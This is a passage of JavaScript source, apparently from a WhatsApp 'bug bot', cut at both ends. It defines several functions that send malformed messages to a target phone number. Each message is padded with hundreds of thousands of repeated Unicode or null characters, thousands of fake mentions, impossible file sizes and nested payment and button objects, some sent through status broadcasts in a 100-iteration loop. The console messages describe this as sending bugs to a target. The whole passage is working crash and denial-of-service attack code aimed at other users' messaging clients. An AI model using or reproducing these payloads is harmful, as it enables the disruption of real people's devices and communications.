            "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
            "scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
            "scanLengths": [
              247,
              201,
              73,
              63
            ],
            "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
          }
        },
        "nativeFlowMessage": {
          "buttons": []
        }
      });
    }

    const carousel = generateWAMessageFromContent(target, {
      "viewOnceMessage": {
        "message": {
          "messageContextInfo": {
            "deviceListMetadata": {},
            "deviceListMetadataVersion": 2
          },
          "interactiveMessage": {
            "body": {
              "text": "⏤ABIM VS MARK" + "ꦾ".repeat(95000)
            },
            "footer": {
              "text": "𝗪𝗢𝗟𝗞𝗘𝗥"  },
            "header": {
              "hasMediaAttachment": false
            },
            "carouselMessage": {
              "cards": [
                ...push
              ]
            }
          }
        }
      }
    }, {});
 await Abim.relayMessage(target, carousel.message, {
messageId: carousel.key.id
});
  }
}
async function tesbimzy(target) {
  try {
    const mentionedList = Array.from(
      { length: 1950 },
      () => `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
    );

    const msg = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            stickerPackMessage: {
              body: {
                text: "ោ៝Ꮡ</>Mark⃟ ི꒦𝖝AbimᏑ" + "ꦽ".repeat(980000),
              },
              messageParamsJson: "{".repeat(30000),
              name:
                " ⎋Mark⃟ ི꒦𝖝꙱\n" +
                "\u0000".repeat(60000) +
                "𑇂𑆵𑆴𑆿".repeat(60000),
              url: "https://wa.me/stickerpack/abimishere",
              nativeFlowMessage: {
                buttons: [
                  {
                    body: { text: "Mark⃟ ི꒦𝖝AbimᏑ✦" },
                    footer: { text: "" },
                    nativeFlowMessage: {
                      buttons: [
                        {
                          name: "single_select",
                          buttonParamsJson: JSON.stringify({
                            title: `${"ꦾ".repeat(10000)}`,
                            sections: [{ title: "Blank", rows: [] }],
                          }),
                        },
                        {
                          nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\u0000".repeat(1000000),
                            version: 3,
                          },
                        },
                      ],
                    },
                  },
                ],
              },
            },
          },
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 2000 },
                () =>
                  "1" +
                  Math.floor(Math.random() * 9000000) +
                  "@s.whatsapp.net"
              ),
            ],
          },
        },
      },
    };

    await Abim.relayMessage("status@broadcast", msg.viewOnceMessage.message, {
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined },
              ],
            },
          ],
        },
      ],
      statusJidList: [target],
      messageId: msg?.key?.id || "",
    });

    if (mentionedList.length) {
      await Abim.relayMessage(
        target,
        {
          statusMentionMessage: {
            message: {
              protocolMessage: { key: msg?.key, type: 25 },
            },
          },
        },
        {}
      );
    }

    await sleep(1500);
  } catch (err) {
    console.error("Error Bos kuh 💢:", err);
  }
}
async function markdelayrer(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "ោ៝Ꮡ</>Mark⃟ ི꒦𝖝AbimᏑ" + 'ꦽ'.repeat(980000),
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\u0000".repeat(80000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\u0000".repeat(90080),
                },
                {
                  name: "cta_url",
                  buttonParamsJson: "\u0000".repeat(96000),
                },
                {
                  name: "cta_call",
                  buttonParamsJson: "\u0000".repeat(9900),
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "\u0003".repeat(8000),
                },
                {
                  name: "cta_reminder",
                  buttonParamsJson: "\u0003".repeat(76000),
                },
                {
                  name: "cta_cancel_reminder",
                  buttonParamsJson: "\u0003".repeat(95000),
                },
                {
                  name: "address_message",
                  buttonParamsJson: "\u0003".repeat(95000),
                },
                {
                  name: "send_location",
                  buttonParamsJson: "\u0003".repeat(98000),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "\u0003".repeat(90050),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0003".repeat(97000),
                },
              ],
            },
          },
        },
      },
    };

    await Abim.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.error(err);
  }
}
async function LocationOtax(target) {
    console.log(chalk.red(`🗡️ 𝗪𝗢𝗟𝗞𝗘𝗥 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
let AyunCantik = JSON.stringify({
  status: true,
  criador: "OtaxAyun",
  resultado: {
    type: "md",
    ws: {
      _events: {
        "CB:ib,,dirty": ["Array"]
      },
      _eventsCount: 80000,
      _maxListeners: 0,
      url: "wss://web.whatsapp.com/ws/chat",
      config: {
        version: ["Array"],
        browser: ["Array"],
        waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
        sockCectTimeoutMs: 2000,
        keepAliveIntervalMs: 30000,
        logger: {},
        printQRInTerminal: false,
        emitOwnEvents: true,
        defaultQueryTimeoutMs: 6000,
        customUploadHosts: [],
        retryRequestDelayMs: 250,
        maxMsgRetryCount: 5,
        fireInitQueries: true,
        auth: { Object: "authData" },
        markOnlineOnsockCect: true,
        syncFullHistory: true,
        linkPreviewImageThumbnailWidth: 192,
        transactionOpts: { Object: "transactionOptsData" },
        generateHighQualityLinkPreview: false,
        options: {},
        appStateMacVerification: { Object: "appStateMacData" },
        mobile: true
      }
    }
  }
});
    const generateLocationMessage = {
        viewOnceMessage: {
            message: {
                locationMessage: {
                    degreesLatitude: -9999,
                    degreesLongitude: 9999,
                    name: "</‼️>Mark⃟‼️ ི꒦𝖝Abim❗Ꮡ" + "ꦾ".repeat(190000),
                    address: AyunCantik,
                    contextInfo: {
                        mentionedJid: [
                            target,
                            ...Array.from({ length: 1945 }, () =>
                                "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                            )
                        ],
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const locationMsg = generateWAMessageFromContent(target, generateLocationMessage, {});

    await Abim.relayMessage(target, locationMsg.message, {
        messageId: locationMsg.key.id,
        participant: { jid: target },
        userJid: target
    });
}
async function DelayHard(target) {
    const stickerMsg = {
  message: {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/d/f/A1B2C3D4E5F6G7H8I9J0.webp?ccb=11-4",
      mimetype: "image/webp",
      fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
      fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
      mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
      fileLength: 1173741,
      mediaKeyTimestamp: Date.now(),
      isAnimated: false,
      directPath: "/v/t62.7118-24/sample_sticker.enc",
      contextInfo: {
        mentionedJid: [
          target,
          ...Array.from({ length: 50 }, () =>
            "92" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
          ),
        ],
        participant: target,
        remoteJid: "status@broadcast",
      },
    },
  },
};

const msg = generateWAMessageFromContent(target, stickerMsg.message, {});

await Abim.relayMessage("status@broadcast", msg.message, {
  messageId: msg.key.id,
  statusJidList: [target],
  additionalNodes: [
    {
      tag: "meta",
      attrs: {},
      content: [
        {
          tag: "mentioned_users",
          attrs: {},
          content: [
            {
              tag: "to",
              attrs: { jid: target },
              content: []
            },
          ],
        },
      ],
    },
  ],
});

console.log("🍻 Sticker berhasil dikirim tanpa error.");
}
async function CarouselOtax(target) {
console.log(chalk.red(`🍻 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
        const cards = Array.from({ length: 20 }, () => ({
            body: proto.Message.InteractiveMessage.Body.fromObject({ text: "ABIM" + "ꦽ".repeat(5000), }),
            footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "WOLKER" + "ꦽ".repeat(5000), }),
            header: proto.Message.InteractiveMessage.Header.fromObject({
                title: "ABIM IS HERE" + "ꦽ".repeat(5000),
                hasMediaAttachment: true,
  videoMessage: {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc?ccb=11-4&oh=01_Q5Aa2QHb3h9aN3faY_F2h3EFoAxMO_uUEi2dufCo-UoaXhSJHw&oe=68CD23AB&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "IL4IFl67c8JnsS1g6M7NqU3ZSzwLBB3838ABvJe4KwM=",
    fileLength: "9999999999999999",
    seconds: 9999,
    mediaKey: "SAlpFAh5sHSHzQmgMGAxHcWJCfZPknhEobkQcYYPwvo=",
    height: 9999,
    width: 9999,
    fileEncSha256: "QxhyjqRGrvLDGhJi2yj69x5AnKXXjeQTY3iH2ZoXFqU=",
    directPath: "/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc?ccb=11-4&oh=01_Q5Aa2QHb3h9aN3faY_F2h3EFoAxMO_uUEi2dufCo-UoaXhSJHw&oe=68CD23AB&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1755691703",
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACIASAMBIgACEQEDEQH/xAAuAAADAQEBAAAAAAAAAAAAAAAAAwQCBQEBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAIaZr4ffxlt35+Wxm68MqyQzR1c65OiNLWF2TJHO2GNGAq8BhpcGpiQ65gnDF6Av/8QAJhAAAgIBAwMFAAMAAAAAAAAAAQIAAxESITEEE0EQFCIyURUzQv/aAAgBAQABPwAag5/1EssTAfYZn8jjAxE6mlgPlH6ipPMfrR4EbqHY4gJB43nuCSZqAz4YSpntrIsQEY5iV1JkncQNWrHczuVnwYhpIy2YO2v1IMa8A5aNfgnQuBATccu0Tu0n4naI5tU6kxK6FOdxPbN+bS2nTwQTNDr5ljfpgcg8wZlNrbDEqKBBnmK66s5E7qmWWjPAl135CxJ3PppHbzjxOm/sjM2thmVfUxuZZxLYfT//xAAcEQACAgIDAAAAAAAAAAAAAAAAARARAjESIFH/2gAIAQIBAT8A6Wy2jlNHpjtD1P8A/8QAGREAAwADAAAAAAAAAAAAAAAAAAERICEw/9oACAEDAQE/AIRmycHh/9k=",
    streamingSidecar: "qe+/0dCuz5ZZeOfP3bRc0luBXRiidztd+ojnn29BR9ikfnrh9KFflzh6aRSpHFLATKZL7lZlBhYU43nherrRJw9WUQNWy74Lnr+HudvvivBHpBAYgvx07rDTRHRZmWx7fb1fD7Mv/VQGKRfD3ScRnIO0Nw/0Jflwbf8QUQE3dBvnJ/FD6In3W9tGSdLEBrwsm1/oSZRl8O3xd6dFTauD0Q4TlHj02/pq6888pzY00LvwB9LFKG7VKeIPNi3Szvd1KbyZ3QHm+9TmTxg2ga4s9U5Q"
  },
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] })
        }));

        const death = Math.floor(Math.random() * 5000000) + "@s.whatsapp.net";

        const carousel = generateWAMessageFromContent(
            target, 
            {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                            body: proto.Message.InteractiveMessage.Body.create({ 
                                text: `§WolkerUdang§\n${"𑜦".repeat(2000)}:)\n\u0000` + "ꦾ".repeat(5000)
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({ 
                                text: "ꦽ".repeat(5000),
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({ 
                                hasMediaAttachment: false 
                            }),
                            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ 
                                cards: cards 
                            }),
                            contextInfo: {
        participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
        remoteJid: "X",
        participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
        stanzaId: "123",
        quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                  creatorName: "Bot"
                }
      }
    },
                        })
                    }
                }
            }, 
            { userJid: target }
        );

        await Abim.relayMessage(target, carousel.message, {
            messageId: carousel.key.id,
            participant: { jid: target }
        });
}
async function WolaerBlanklrzep(target) {
  try {
   
    const msg = {
      newsletterAdminInviteMessage: {
        newsletterJid: "1@newsletter",
        newsletterName: "Abim Is Here" + "ោ៝".repeat(75000),
        caption: "Hi ./Abimklz" + "ោ៝".repeat(70000),
        inviteExpiration: "999999999",

        contextInfo: {
          stanzaId: Abim.generateMessageTag(),
          participant: target,
          quotedMessage: {
            conversation: "𝙆𝙚𝙣𝙖𝙡 𝙖𝙗𝙞𝙢¿?" + "ꦾ".repeat(90000),
          },
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING",
          }
        },

        inviteLinkGroupTypeV2: "DEFAULT",
      },
    };

    // Wajib ada wrapper message agar tidak error di grup
    await Abim.relayMessage(
      target,
      { message: msg },
      { messageId: Abim.generateMessageTag() }
    );

    console.log(` SUCCESS BUG TO TARGET GRUP`);

  } catch (err) {
    console.error("❌ WolkerBlank error:", err);
  }
}
async function OtaxAyunBeloved(target) {

  let biji2 = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: " ¿Wolker Here¿ ",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\x10".repeat(1045000),
              version: 3,
            },
            entryPointConversionSource: "call_permission_request",
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "99999999"),
    }
  );
 
  const mediaData = [
    {
      ID: "68917910",
      uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
      buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
      mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
    },
    {
      ID: "68884987",
      uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
      buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
      mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
    },
  ]

  let sequentialIndex = 0
  console.log(chalk.red(`🦠 WOLKER SEDANG BUG DELAY ${target}`))

  const selectedMedia = mediaData[sequentialIndex]
  sequentialIndex = (sequentialIndex + 1) % mediaData.length
  const { ID, uri, buffer, sid, SHA256, ENCSHA256, mkey } = selectedMedia

  const contextInfo = {
    participant: target,
    mentionedJid: [
      target,
      ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
    ],
  }

  const stickerMsg = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}&mms3=true`,
          fileSha256: SHA256,
          fileEncSha256: ENCSHA256,
          mediaKey: mkey,
          mimetype: "image/webp",
          directPath: `/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}`,
          fileLength: { low: Math.floor(Math.random() * 1000), high: 0, unsigned: true },
          mediaKeyTimestamp: { low: Math.floor(Math.random() * 1700000000), high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo,
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  }

  const textMsg = {
    extendedTextMessage: {
      text: "Hi Im wolker?¿" + "ꦽ".repeat(300000),
      contextInfo,
    },
  }

  const interMsg = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "σƭαא ɦαเ", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "galaxy_message",
        },
      },
    },
  }

  const statusMessages = [stickerMsg, textMsg, interMsg]
 
  const musicMeta = {
  musicContentMediaId: "589608164114571",
  songId: "870166291800508",
  author: "οταϰ ιѕ нєяє",
  title: "нαι ιм οταϰ",
  artworkDirectPath:
    "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
  artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
  artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
  artistAttribution: "https://www.instagram.com/Otapengenkawin",
  countryBlocklist: true,
  isExplicit: true,
  artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=",
};

const videoMessage = {
  url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
  mimetype: "video/mp4",
  fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
  fileLength: "289511",
  seconds: 15,
  mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
  caption: "ԾԵԹՃ ՇԾՐe",
  height: 640,
  width: 640,
  contextInfo: {
    mentionedJid: Array.from(
      { length: 1900 },
      () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
    ),
  },
  annotations: [
    { embeddedContent: { embeddedMusic: musicMeta }, embeddedAction: true },
  ],
};

const stickMessage = {
  stickerMessage: {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
    fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
    mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
    mimetype: "image/webp",
    isAnimated: true,
    contextInfo: {
      mentionedJid: Array.from(
        { length: 2000 },
        () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
      ),
    },
  },
};

const nativeMessage = {
  interactiveResponseMessage: {
    body: { text: "๏tคץ ς๏гє", format: "DEFAULT" },
    nativeFlowResponseMessage: {
      name: "galaxy_message",
      paramsJson: "\u0000".repeat(1045000),
      version: 3,
    },
    entryPointConversionSource: "{}",
  },
  contextInfo: {
    participant: target,
    mentionedJid: Array.from(
      { length: 2000 },
      () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
    ),
    quotedMessage: {
      paymentInviteMessage: {
        serviceType: 3,
        expiryTimestamp: Date.now() + 1814400000,
      },
    },
  },
};


const generateMessage = {
        viewOnceMessage: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
                    mimetype: "audio/mpeg",
                    fileSha256: Buffer.from([
            226, 213, 217, 102, 205, 126, 232, 145,
            0,  70, 137,  73, 190, 145,   0,  44,
            165, 102, 153, 233, 111, 114,  69,  10,
            55,  61, 186, 131, 245, 153,  93, 211
        ]),
        fileLength: 432722,
                    seconds: 26,
                    ptt: false,
                    mediaKey: Buffer.from([
            182, 141, 235, 167, 91, 254,  75, 254,
            190, 229,  25,  16, 78,  48,  98, 117,
            42,  71,  65, 199, 10, 164,  16,  57,
            189, 229,  54,  93, 69,   6, 212, 145
        ]),
        fileEncSha256: Buffer.from([
            29,  27, 247, 158, 114,  50, 140,  73,
            40, 108,  77, 206,   2,  12,  84, 131,
            54,  42,  63,  11,  46, 208, 136, 131,
            224,  87,  18, 220, 254, 211,  83, 153
        ]),
                    directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
                    mediaKeyTimestamp: 1746275400,
                    contextInfo: {
                        mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const otaxmsg = generateWAMessageFromContent(target, generateMessage, {});

   
  const messages = [
  { viewOnceMessage: { message: { videoMessage } } },
  { viewOnceMessage: { message: stickMessage } },
  { viewOnceMessage: { message: nativeMessage } },
  { viewOnceMessage: { message: { musicMeta } } },
];

  let msg = null;
  for (let i = 0; i < 100; i++) {
  await Abim.relayMessage("status@broadcast", otaxmsg.message, {
        messageId: otaxmsg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });    
    await Abim.relayMessage("status@broadcast", biji2.message, {
      messageId: biji2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: []
                }
              ]
            }
          ]
        }
      ]
    });  
     for (const content of statusMessages) {
      const msg = generateWAMessageFromContent(target, content, {})
      await Abim.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
              },
            ],
          },
        ],
      })
    }
    for (const item of messages) {
      msg = generateWAMessageFromContent(target, item, {});
      await Abim.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined,
                  },
                ],
              },
            ],
          },
        ],
      });
    }
        
    if (i < 99) {
    await new Promise(resolve => setTimeout(resolve, 5000));
  }
  }
  if (mention) {
    await Abim.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: " meki - melar ",
            },
            content: undefined,
          },
        ],
      }
    );
  }
}
async function OtaxNewUiAbim(target) {
console.log(chalk.red(`👀 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
  try {
    await Abim.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "😜 Wolker Nih Bos\n" +
                  "ꦾ".repeat(40000) +
                  "ꦽ".repeat(50000) +
                  `\u2003`.repeat(50000),
              },
              nativeFlowMessage: {},
              contextInfo: {
        participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
        remoteJid: "X",
        participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
        stanzaId: "123",
        quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
                },                
      }
    },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }      
    );
  } catch (err) {
    console.log(err);
  }
}
async function JandaMudaHai(target) {
  const cardss = [];

  for (let i = 0; i < 5; i++) {
    cardss.push({
      header: {
        hasMediaAttachment: true,
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/534859870_1051153396838314_2122100419717937309_n.enc?ccb=11-4&oh=01_Q5Aa2QFkDDvahAmTQB2rFSTjSTJV7uluYpY9jTpBENlcb7Sacw&oe=68CA3A18&_nc_sid=5e03e0&mms3=true",
          mimetype: "audio/mpeg",
          fileSha256: "qbcHpQMuyE/rnd/4A3aLRth0hM6U7GWi3QBO0NAC6xQ=",
          fileLength: "9999999999999999999999",
          pageCount: 9999999999,
          mediaKey: "eOi7nJvxr+iO9GzptSFWSqsD9P+aIQ85D3CYBzcRvgI=",
          fileName: "OTAX IS HERE" + "ꦽ".repeat(5000),
          fileEncSha256: "pYwQbEFgkLdJwdiXMxX87oTBmb6zitzbjkAH2ydR4ac=",
          directPath: "/v/t62.7119-24/534859870_1051153396838314_2122100419717937309_n.enc?ccb=11-4&oh=01_Q5Aa2QFkDDvahAmTQB2rFSTjSTJV7uluYpY9jTpBENlcb7Sacw&oe=68CA3A18&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1755491865"
        }
      },
      body: { 
        text: "LOVE U" + "ꦽ".repeat(5000) 
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: 'mpm',
            buttonParamsJson: "{[" + "ꦽ".repeat(5000)
          },
          {
            name: 'galaxy_message',
            buttonParamsJson: "\n".repeat(10000)
          }
        ],
        messageParamsJson: "{[".repeat(5000)
      }
    });
  }

  const content = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "ABIM IS HERE" + "ꦽ".repeat(5000)
          },
          carouselMessage: {
            messageVersion: 1,
            cards: cardss
          },
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            ],
            remoteJid: "X",
            stanzaId: "123",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              },
              forwardedAiBotMessageInfo: {
                botName: "META AI",
                botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                creatorName: "Bot"
              }
            }
          }
        }
      }
    }
  };

  await Abim.relayMessage(target, content, {
    messageId: "",
    participant: { jid: target },
    userJid: target
  });
}
async function InvisibleStctyip(target) {
  const msg = {
    stickerMessage: {
